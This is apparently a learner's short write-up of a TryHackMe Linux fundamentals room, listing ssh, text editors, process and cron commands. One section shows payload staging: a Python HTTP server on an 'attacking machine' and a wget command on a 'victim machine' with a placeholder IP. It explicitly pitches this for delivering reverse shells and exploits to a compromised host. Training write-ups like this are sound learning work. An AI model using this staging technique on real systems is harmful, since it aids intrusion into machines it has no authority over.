# linux fundamentals 

**Platform:** TryHackMe  
**Date:** 2026-03-10  
**Difficulty:** Easy

## Description
Room about using fundamentals linux commands and windows fundamentals

## What am learned
- login in to machine by ssh
- using nano and VIM terminal text editors
- wget , scp , pythons3 httpserver, wget
- processes (ps, top , ps aux, kill, systemctl, fg , cron, crontab -l, apt)

## Tools and commands
- File Transfer via Python HTTP Server

When you need to transfer a file to a compromised machine:

**On your attacking machine** — start a simple HTTP server in the 
directory containing the file you want to transfer:
```bash
python3 -m http.server
```

**On the victim machine** — download the file from your machine:
```bash
wget http://<your-ip>:8000/<filename>
```

**Why two terminals?**  
The HTTP server must stay running while wget fetches the file — 
so both commands run simultaneously.

**Real-world use case:**  
You've compromised a machine but it lacks the tools you need 
(reverse shell, exploit etc.). Your attacking machine acts as 
a temporary file server to deliver payloads or scripts.

## What was difficult
Find process in crontab
